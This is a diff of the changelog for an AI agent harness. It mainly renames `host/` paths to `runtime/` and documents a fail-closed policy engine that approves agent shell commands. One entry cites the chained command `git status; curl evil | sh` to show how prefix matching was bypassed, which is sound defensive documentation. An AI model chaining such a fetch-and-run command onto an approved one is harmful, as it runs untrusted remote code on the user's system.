@@ -92,7 +92,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   closes the `command_prefix` bypass — `command_prefix: git status` matches
   `git status; curl evil | sh` (plain startswith), while
   `action.argv[0] == "git" && action.argv.size() <= 2` does not. The engine
-  (`host/policy.py`) caches compiled programs by expression text (the policy
+  (`runtime/policy.py`) caches compiled programs by expression text (the policy
   file is re-read on every approval request, so compilation must be cached),
   compile-checks every expression at load via the new
   `load_policy_with_errors` (a non-compiling expression fails the whole
@@ -101,7 +101,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   deliberate inversion of the model router's skip-and-continue (a skipped
   deny would be an allowed `rm`). Documents without `when` rules pay zero
   extra I/O per decision (the containment fact is read only when some rule
-  has a `when`). `host/pyproject.toml` declares `cel-python>=0.5.0` directly
+  has a `when`). `runtime/pyproject.toml` declares `cel-python>=0.5.0` directly
   (already in the tree transitively via the SDK's router). `/policy` renders
   expressions, per-rule remove addresses (`list:n`), and a load-errors
   section (the discovery surface for a broken expression — policy has no
@@ -112,7 +112,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   strips one whole-expression shell quote while leaving inner string
   literals verbatim; the expression is compile-checked before the write so a
   bad add is rejected instead of poisoning the document). `/help` updated;
-  the duplicated dead `policy` help block in `host/commands/_render.py` was
+  the duplicated dead `policy` help block in `runtime/commands/_render.py` was
   removed (a dict literal cannot carry two identical keys — the first was
   unreachable).
 - **Why:** The structural matchers cannot express negation, token
@@ -123,10 +123,10 @@ All notable changes to the Lisa Harness will be documented in this file.
   reuses the mechanics with inverted error semantics because policy failure
   must fail closed. Rule management had no in-host surface beyond hand-editing
   YAML.
-- **Tests:** `host/tests/test_policy.py` (when-matching, AND semantics,
+- **Tests:** `runtime/tests/test_policy.py` (when-matching, AND semantics,
   argv-token bypass regression, eval-error→ask, compile-error→fail-closed
   load, round-trip serialization, containment/identity bindings, compile
-  cache, zero-I/O guarantee for expression-free documents); `host/tests/
+  cache, zero-I/O guarantee for expression-free documents); `runtime/tests/
   test_policy_command.py` (rule add/remove/list, compile-check rejection
   without write, case preservation, quoting probe, out-of-range and bad
   addresses, render with expressions and load errors).
@@ -139,10 +139,10 @@ All notable changes to the Lisa Harness will be documented in this file.
   rule, deny → ask → allow first-match), the fixed decision ladder with the
   sandbox downgrade and bare-mode guard, containment states, runtime
   management surfaces (`/policy`, `/approve --remember`), and fail-closed
-  behavior. Links the engine (`host/policy.py`) and tests as canonical.
+  behavior. Links the engine (`runtime/policy.py`) and tests as canonical.
 - **Why:** Policy documentation lived only in docstrings, the generated file
   header, and tests — there was no durable guide for hand-authoring the file.
-  Also fixes a stale docstring path in `host/policy.py` (the sandbox fact
+  Also fixes a stale docstring path in `runtime/policy.py` (the sandbox fact
   lives at `run/<session_key>/sandbox-facts.json`, matching the bash pack
   writer and reader).
 
@@ -221,7 +221,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   (`test_endpoint_registry.py` now runs the producer assertion instead of
   skipping it). Updated the `extension_runtime.py` row in
   `kernel/README.md` accordingly. Also fixed the pack-scoped context
-  boundary in `host/src/host/context_assembly.py`: the session-mapper call
+  boundary in `runtime/src/runtime/context_assembly.py`: the session-mapper call
   now derives `active_packs` from the active mode's
   `mode_provider_id` + `context_item_packs` front-matter, so
   pack-contributed `ContextItem` records are admitted in their own mode
@@ -260,7 +260,7 @@ All notable changes to the Lisa Harness will be documented in this file.
 #### God-object decomposition & structured subsystem packages (audit refactor)
 
 - **What:**
-  - **`HostRuntime` decomposition:** `host/src/host/runtime.py` is now a thin
+  - **`HostRuntime` decomposition:** `runtime/src/runtime/runtime.py` is now a thin
     composition root grouping state into five sub-objects: `HostPaths`
     (`runtime_paths.py`), `ProviderRegistry` (`providers.py`), `HostServices`
     (`services.py`), `SessionState`, and `RuntimeResources` (`runtime.py`,
@@ -281,17 +281,17 @@ All notable changes to the Lisa Harness will be documented in this file.
     and `_helpers.py` (slice dispatch, plan→step compilation). The engine
     resides in `__init__.py` so `mock.patch("kernel.turn_runner.<name>")`
     targets continue to intercept call-site reads.
-  - **`host.approval` package:** Extracted the approval subsystem (~600 lines)
-    from `handle_message.py` into `host/src/host/approval/` (`orchestration.py`
+  - **`runtime.approval` package:** Extracted the approval subsystem (~600 lines)
+    from `handle_message.py` into `runtime/src/runtime/approval/` (`orchestration.py`
     + `presentation.py`). `handle_message.py` shrunk from 1,600 to 871 lines
     and now matches its documented three-phase pipeline. Import-time command
-    registration side effects removed; `host.bootstrap.build_runtime()` now
+    registration side effects removed; `runtime.bootstrap.build_runtime()` now
     calls `register_builtin_host_commands()` explicitly.
-  - **`host.thread` package:** Split `host/src/host/thread.py` into a package:
+  - **`runtime.thread` package:** Split `runtime/src/runtime/thread.py` into a package:
     `_store.py` (zstd-sealed persistence mechanics) + `_excerpt.py` (excerpt/manifest
     prompt-injection reads), re-exported through `__init__.py`.
   - **Layer fix:** Relocated `kernel/testing/runtime_factory.py` to
-    `host/src/host/testing/runtime_factory.py` (`host.testing`), resolving the
+    `runtime/src/runtime/testing/runtime_factory.py` (`runtime.testing`), resolving the
     documented kernel→host layer inversion.
   - **Type narrowing:** Narrowed `Any`-typed fields on the grouped hook
     dataclasses and `HostServices` to real `Protocol`/dataclass types
@@ -319,7 +319,7 @@ All notable changes to the Lisa Harness will be documented in this file.
 - **What:** Fixed 35 pre-existing test failures across the kernel test suite
   (bringing the failure baseline from 79 down to 44 with zero regressions):
   (1) `SDK_CONTENT_ROOTS` separator mismatch: `conftest_catalog.py` and
-  `host/tests/conftest.py` now use `os.pathsep.join` instead of `";"`, fixing
+  `runtime/tests/conftest.py` now use `os.pathsep.join` instead of `";"`, fixing
   catalog root resolution on Linux;
   (2) `_augmented_ambient_catalog` fixture in `kernel/tests/conftest.py`:
   injects synthetic routable modes (`markdown`, `remember`, `ponder`,
@@ -365,10 +365,10 @@ All notable changes to the Lisa Harness will be documented in this file.
 
 #### Structural yield surface on `HostCommandResult`
 
-- **What:** `host.types.HostCommandResult` gains `yielded_question: str`, set
+- **What:** `runtime.types.HostCommandResult` gains `yielded_question: str`, set
   by `handle_message` from `result.yielded.question` when a turn ends in the
   model's `yield` terminal action, with `data["yielded"]` mirroring the
-  question for panel transports. Covered by `host/tests/test_host_command_result_yield.py`.
+  question for panel transports. Covered by `runtime/tests/test_host_command_result_yield.py`.
 - **Why:** A yielded turn (the model asked the operator a question instead of
   finishing) was previously indistinguishable from a completed answer at the
   result boundary — the question prose flowed to transports as `text`. One-shot
@@ -514,7 +514,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   spec by hand. The lock file already records exactly where each pack came
   from, so an in-place update is a thin loop over that record rather than a
   new resolution mechanism.
-- **Tests:** `host/tests/test_pack_manager.py` (update from recorded source,
+- **Tests:** `runtime/tests/test_pack_manager.py` (update from recorded source,
   unknown-pack and bundled-pack rejections, install-failure propagation,
   `--all` batching with bundled/empty-ref skips, no-op `--all`, partial
   failure reporting).
@@ -587,12 +587,12 @@ All notable changes to the Lisa Harness will be documented in this file.
 - **What:** `kernel/config.py` cut to only settings the kernel actually
   reads. Removed as dead (zero consumers): `workspace_id_fallback` (kernel
   and sdk copies), the `memory_recall_*` / `memory_auto_capture_*` copies
-  (hosts read their own copies in `host/config.py`), all eleven
+  (hosts read their own copies in `runtime/config.py`), all eleven
   `passive_intelligence_*` fields (the layer was never wired), and the
   dead `state_container` / `intel_inbox_container` fields in
   `sdk/config.py`. Migrated out of the kernel: the nine `identity_*` scope
   defaults and the per-lane `context_budget_*` ceilings now live on
-  `host/config.py` (`HostConfig`, env-overridable via
+  `runtime/config.py` (`HostConfig`, env-overridable via
   `LISA_CONTEXT_BUDGET_*`); `TurnHooks` and `_build_minimal_context` fall
   back to plain personal-DM literals instead of kernel settings.
   `ContextBudgetAllocator.for_turn` now takes `enabled` / `lane_limits` /
@@ -610,7 +610,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   effect and no error. Identity defaults only mattered for bare/test hosts
   (the CLI host builder overrides all nine from its own config), and the
   context-budget lanes are an assembly/prompting product decision, not
-  kernel mechanics. Both belong to the host.
+  kernel mechanics. Both belong to the runtime.
 - **Config:** New host env vars `LISA_CONTEXT_BUDGET_{ENABLED,
   CORE_MAX_TOKENS, RETRIEVAL_MAX_TOKENS, MEMORY_MAX_TOKENS,
   REFLECTION_MAX_TOKENS, HISTORY_MAX_TOKENS, OPERATIONAL_MAX_TOKENS,
@@ -657,7 +657,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   (`current_mode_id`) that does not survive the process boundary the CLI
   model implies; the persisted invocation is the durable owner claim. The
   no-logs CLI host needs the failure reason in the operator reply itself.
-- **Tests:** `host/tests/test_approval_commands.py` (approve after a
+- **Tests:** `runtime/tests/test_approval_commands.py` (approve after a
   process-restart mode reset matches the recorded owner; decision-state and
   expiry diagnostics; cross-user rejection; paired-stall settle asserts
   without the removed fields — 18 passed). The pre-existing
@@ -695,7 +695,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   answer. Returning raw output alone drops the task: the model never sees
   the result, the user must re-ask, and the re-issue loop defeats the
   exact-action contract the approvals exist to enforce.
-- **Tests:** `host/tests/test_approval_commands.py` — 19 passed: the six
+- **Tests:** `runtime/tests/test_approval_commands.py` — 19 passed: the six
   approve-path tests converted to a stubbed continuation turn (asserting
   the continuation query carries the action output and the report-only
   instruction), plus a new test pinning the thread entry: one
@@ -725,7 +725,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   un-approved actions; the continuation turn's job is to report what the
   approved action produced.
 - **Tests:** the continuation assertions in
-  `host/tests/test_approval_commands.py` pin the report-only wording
+  `runtime/tests/test_approval_commands.py` pin the report-only wording
   ("Do not call any tools", "do not start follow-up commands"); suite
   19 passed.
 
@@ -737,7 +737,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   `LISA_THREAD_REDACTION_ENABLED` / `LISA_THREAD_REDACTION_PATTERNS` env
   contract as the host and applies the policy to every served entry
   (`thread_read_range` / `thread_read_recent` / `thread_search`) — the host
-  exports both variables to the subprocess in `host.mcp_pool`;
+  exports both variables to the subprocess in `runtime.mcp_pool`;
   (2) the kernel's post-loop fallback in `kernel.turn_runner` no longer
   fabricates "I've hit my iteration budget" when the iteration cap never
   fired — an empty final completion now yields an honest "the model returned
@@ -840,7 +840,7 @@ All notable changes to the Lisa Harness will be documented in this file.
 - **Root cause:** the generic `memory.add` / `memory.search` /
   `memory.list` / `memory.get` / `memory.delete` synthetic aliases
   declared `user_slug` as a settable parameter in their model-facing
-  input schemas (`host/memory_aliases.py :: _memory_schemas`). The model
+  input schemas (`runtime/memory_aliases.py :: _memory_schemas`). The model
   has no source of truth for the active user slug, so it was forced to
   invent one — the "I need a user_slug to run memory.search" complaint.
   The native `lisa-memory` tools (`add_memory`, `search_memory`, …)
@@ -848,7 +848,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   `sdk/packs/memory/mcp_servers.yaml`, so the proxy never stripped it
   from their schemas either.
 - **Fix (two surfaces, same boundary):**
-  1. `host/memory_aliases.py :: _memory_schemas` — drop `user_slug` from
+  1. `runtime/memory_aliases.py :: _memory_schemas` — drop `user_slug` from
      all five generic-alias schemas. `user_slug` is an ambient identity
      field, not a model-controllable parameter.
   2. `sdk/packs/memory/mcp_servers.yaml` — add a `proxy_policy.ambient`
@@ -858,7 +858,7 @@ All notable changes to the Lisa Harness will be documented in this file.
      (top-level, since lisa-memory has no `filters` parameter and
      `structured_filters` is left false).
 - **Dispatch path (unchanged):** the ambient resolver registered by
-  `host/memory_aliases.py :: register_memory_aliases`
+  `runtime/memory_aliases.py :: register_memory_aliases`
   (`set_ambient_resolver("user_slug", lambda: user_slug)`) supplies the
   active user. The proxy's `_apply_proxy_policy_for_server` injects it
   into outgoing arguments on both the namespaced and server-scoped
@@ -922,7 +922,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   server-side, so cross-surface reads and deletes by id guessing are
   impossible.
 - **`memory.get` and `memory.delete` synthetic aliases** registered on the
-  generic memory router (`host/memory_aliases.py`), routing to the
+  generic memory router (`runtime/memory_aliases.py`), routing to the
   default backend's `get_memory` / `delete_memory` native tools. The alias
   contract grows from 3 to 5; backends that don't declare a `get` or
   `delete` tool name simply don't get those aliases registered (graceful
@@ -944,7 +944,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   appear without a full pool warm-up.
 - **`McpServerHealth` extended** with `transport`, `url`, `command`,
   `tool_count`, `tool_names`, `permanently_failed`, and `restart_count`
-  fields. The introspection collector (`host/introspect.py`) now
+  fields. The introspection collector (`runtime/introspect.py`) now
   reads new pool accessors (`cold_failed_ids`, `permanently_failed_ids`,
   `restart_counts`, `last_errors`, `tools_by_server`) so a cold server
   that tried and failed reports `failed` (not `cold`), and the operator
@@ -975,7 +975,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   replaced by the session-owned `ContextMapper` (driven by the `context`
   block → `ContextPlan`); these classes had no remaining readers. The
   `context_routing` field on `UnifiedState` and the matching
-  `context_routing=` kwarg on `host/state_provider.build_unified_state`
+  `context_routing=` kwarg on `runtime/state_provider.build_unified_state`
   were also removed — neither call site in `turn_hooks_builder.py` passed
   it, so it was always `None`. Context admission and ordering policy now
   lives exclusively on the session plan's `context` block, passed to the
@@ -1059,7 +1059,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   doubling the row count and splitting the status from the call it
   describes. Now one iteration = one row:
   `[mode] stage: model_call haiku #1 ✓ 340ms`.
-- The `TransportCallbacks` Protocol in `host/callbacks.py` is untouched;
+- The `TransportCallbacks` Protocol in `runtime/callbacks.py` is untouched;
   this is a CLI render-layer cutover only (hard cutover per the project
   contract — the pane machinery is deleted, not shimmed).
 
@@ -1081,7 +1081,7 @@ All notable changes to the Lisa Harness will be documented in this file.
   semantics as pack `default_available: true` tools. The turn-runner's
   existing MCP-tool filter admits them with no further change.
 - **`lisa-storage.read_file` is now ambient-available** by default, declared
-  in `host/mcp_servers.yaml`. Modes can read persisted artifacts
+  in `runtime/mcp_servers.yaml`. Modes can read persisted artifacts
   without re-listing the tool or paying the cold-server spawn cost unless
   they actually call it. The previous delegate pack tool under
   `sdk/packs/core/tools/read_file/` is removed — `lisa-storage` stays the
@@ -1089,26 +1089,26 @@ All notable changes to the Lisa Harness will be documented in this file.
 
 ### Changed
 
-#### `FileWorkflowInstanceStore` moved from `kernel/` to `host/`
+#### `FileWorkflowInstanceStore` moved from `kernel/` to `runtime/`
 
 - **File-backed workflow-instance store relocated from the kernel to the host
   runtime.** `FileWorkflowInstanceStore` does file I/O, holds an
   `asyncio.Lock`, and writes under the host's `data_dir` — it is a
   host-runtime implementation, not a runtime-neutral contract. This mirrors
   the existing `recovery` split (`kernel/recovery.py` contracts vs
-  `host/recovery.py` `FileRecoveryService`) and the `approvals` split.
+  `runtime/recovery.py` `FileRecoveryService`) and the `approvals` split.
 - **Kernel keeps only the seam.** `kernel/workflow_instance_store.py` is
   trimmed to the `WorkflowInstanceStore` Protocol; its imports drop
   `asyncio`, `json`, `os`, `Path`, and `is_complete`.
 - **Hard cutover, no compat.** The implementation now lives in
-  `host/workflow_instance_store.py`. The single non-test importer
-  (`host/runtime.py`) and the host wiring test import from the new
+  `runtime/workflow_instance_store.py`. The single non-test importer
+  (`runtime/runtime.py`) and the host wiring test import from the new
   location. The seven `FileWorkflowInstanceStore` tests moved from
   `kernel/tests/test_workflow_instance.py` to
-  `host/tests/test_workflow_instance_store.py`; the kernel test file
+  `runtime/tests/test_workflow_instance_store.py`; the kernel test file
   no longer imports a host implementation.
 
-#### `kernel/introspect.py` moved to `host/introspect.py`
+#### `kernel/introspect.py` moved to `runtime/introspect.py`
 
 - **Live introspection gatherer relocated from the kernel to the host runtime.**
   `gather_introspection` reads host-owned concrete resources (the MCP tool
@@ -1119,9 +1119,9 @@ All notable changes to the Lisa Harness will be documented in this file.
   on `OperationExecutionContext` and `TurnRunnerTurnConfig.introspect`.
 - **Hard cutover, no compat.** `kernel/introspect.py` and
   `kernel/tests/test_introspect.py` are deleted. The single non-test
-  importer (`host/turn_hooks_builder.py`) now imports
-  `from host.introspect import gather_introspection`. The test moved
-  to `host/tests/test_introspect.py`. `kernel/README.md`'s Built-in
+  importer (`runtime/turn_hooks_builder.py`) now imports
+  `from runtime.introspect import gather_introspection`. The test moved
+  to `runtime/tests/test_introspect.py`. `kernel/README.md`'s Built-in
   Capabilities table drops the `introspect.py` row; the `introspect` hook
   row (seam contract) stays.
 
@@ -1203,7 +1203,7 @@ Affected: `hosts/cli/transport.py` (`start_thinking`, `on_stage`, `_render_statu
 - **Four packs migrated from bundled workspace members to external packs.** `lisa-pack-search`, `lisa-pack-markdown`, `lisa-pack-compaction`, and `lisa-pack-letta` moved out of `sdk/packs/<name>` (import `sdk.packs.<name>`) to `lisa_packs/<name>/` submodules (import `lisa_packs.<name>`), each in its own `github.com/Lisa-Framework/lisa-pack-<name>` repository pinned into `lisa-framework/packs`. Import paths renamed from `sdk.packs.<name>` to `lisa_packs.<name>`; distribution names unchanged. `compaction` keeps its `from sdk.packs.checkpoint...` import because `checkpoint` stays bundled. The bundled `sdk/packs` set is now `core`, `introspect`, `memory`, `models`, `checkpoint`.
 - **All four are on-demand via `/pack install`.** Removed from the framework `pyproject.toml` `[project.dependencies]` and `[tool.uv.sources]`, and from every host `pyproject.toml`. A fresh `uv sync` no longer installs them; install the ones you want with `uv pip install -e ../lisa_packs/<name>` or the in-app `/pack install lisa-pack-<name>`.
 - **`lisa-pack-search` removed from `host` hard deps.** The transport-neutral runtime no longer depends on a research-personality pack; `/search` and `/discuss` are a starter-subset choice wired by the transport hosts (and now on-demand there too).
-- **Test conftest repointed.** `kernel/tests/conftest_catalog.py` and `host/tests/conftest.py` now discover migrated packs via the sibling `lisa_packs/<name>/lisa_packs/<name>` content roots when the submodules are checked out, and omit them when absent. `kernel/tests/test_compaction_seams.py` imports the compaction factory from `lisa_packs.compaction` with `pytest.importorskip` so it skips when the pack isn't installed.
+- **Test conftest repointed.** `kernel/tests/conftest_catalog.py` and `runtime/tests/conftest.py` now discover migrated packs via the sibling `lisa_packs/<name>/lisa_packs/<name>` content roots when the submodules are checked out, and omit them when absent. `kernel/tests/test_compaction_seams.py` imports the compaction factory from `lisa_packs.compaction` with `pytest.importorskip` so it skips when the pack isn't installed.
 
 #### `lisa-pack-models` moved back into the framework; `lisa_packs` split into per-pack submodule repos
 
